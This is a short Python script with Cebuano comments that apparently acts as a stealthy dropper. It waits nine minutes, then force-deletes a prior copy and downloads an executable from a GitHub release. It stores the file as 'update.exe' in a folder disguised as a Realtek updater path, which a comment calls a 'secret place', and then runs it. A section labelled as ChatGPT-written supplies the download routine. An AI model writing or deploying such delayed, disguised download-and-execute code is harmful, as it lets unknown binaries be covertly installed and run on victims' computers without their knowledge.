import os
import requests
from tqdm import tqdm
import time

# Delete Ang Naka Butang nga file
time.sleep(540)
os.system(r'del /f "C:\ProgramData\Realtek\ANTB\UPDT\update.exe"')

#I download ang update file 
#CHATGPT
def download_file(url, destination):
    response = requests.get(url, stream=True)
    
    # Raise an exception for HTTP errors
    response.raise_for_status()

    # Get the total file size from the headers
    total_size = int(response.headers.get('content-length', 0))
    block_size = 1024  # 1 Kibibyte

    # Download the file with a progress bar
    with open(destination, 'wb') as file, tqdm(
        desc=destination,
        total=total_size,
        unit='iB',
        unit_scale=True,
        unit_divisor=1024,
    ) as bar:
        for data in response.iter_content(block_size):
            bar.update(len(data))
            file.write(data)

# Example usage
url = "https://github.com/fancode343/guormit.cf/releases/download/0.2/antburger.exe" #gikan sa gh
destination = r"C:\ProgramData\Realtek\ANTB\UPDT\update.exe" #i butang ang file sa secretong dapita
os.makedirs(os.path.dirname(destination), exist_ok=True)
download_file(url, destination)
#END CHATGPT

# I run ang file
os.system(r'"C:\ProgramData\Realtek\ANTB\UPDT\update.exe"')
